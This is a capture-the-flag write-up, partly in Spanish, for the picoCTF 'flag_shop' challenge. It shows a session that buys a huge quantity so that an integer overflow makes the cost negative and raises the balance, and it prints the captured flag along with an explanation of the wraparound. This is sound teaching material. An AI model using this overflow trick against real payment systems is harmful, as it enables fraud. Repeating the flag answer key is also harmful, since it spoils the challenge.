
# Reto 
### flag_shop
## Descripcion
There's a flag shop selling stuff, can you buy a flag?[Source](https://challenge-files.picoctf.net/c_fickle_tempest/78ff4dc2017455dcaec16a531a6e2c74f26abfe9a844a4196ecb203e7d195d8a/store.c). Connect with nc fickle-tempest.picoctf.net 64446.
## Solucion
```
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3000000

The final cost is: -1594967296

Your current balance after transaction: 1594968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_984Fce5a}

```
## Notas adicionales 
En lenguajes como C, las variables de tipo número entero (`int`) tienen un límite máximo de tamaño (usualmente `2,147,483,647`). Si tú pides comprar una cantidad absurdamente grande de banderas baratas, la multiplicación superará ese límite.

¿Qué pasa cuando un número supera su límite en la memoria? ¡Da la vuelta (overflow) y se convierte en un **número negativo**!

Entonces, si el sistema calcula que tu compra cuesta `-$2,000,000`, al momento de cobrarte hará esto: `Saldo Nuevo = Saldo Actual - Costo Total` `Saldo Nuevo = 1100 - (-2,000,000)` **`Saldo Nuevo = 2,001,100`**

¡El sistema terminará regalándote millones de dólares en lugar de cobrarte!
## Referencias


